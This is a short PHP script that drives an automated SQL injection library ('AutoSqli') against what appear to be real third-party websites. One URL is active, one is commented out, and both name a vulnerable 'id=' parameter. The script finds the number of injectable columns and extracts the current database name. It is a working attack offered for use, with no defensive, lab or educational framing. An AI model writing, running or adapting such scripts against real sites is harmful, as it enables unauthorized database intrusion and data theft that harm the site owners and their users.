<?php

require "lib/AutoSqli.php";
$autosqli = new AutoSqli();

// $autosqli->setUrl("http://www.easygosg.com/attraction-product.php?id=");
$autosqli->setUrl("https://www.granesia.co.id/index.php?t=kalkulasi&fol=kalkulasi&f=kalkulasi_form&id=");

echo "[!] Target Url : " . $autosqli->getUrl() . "\n";

echo "[!] Prepare to get Columns...\n";
$autosqli->findnumbercolumn();

if ($autosqli->getnumbercolumn() == false) {
    echo "Not found number columns or your connection error \n";
    exit;
}

echo "[+] Number Columns: " . $autosqli->getnumbercolumn() . "\n";

echo "[!] Prepare to get Current Database...\n";
$autosqli->findcurrentdatabase();

echo "[+] Current Database: " . $autosqli->getcurrentdatabase() . "\n";
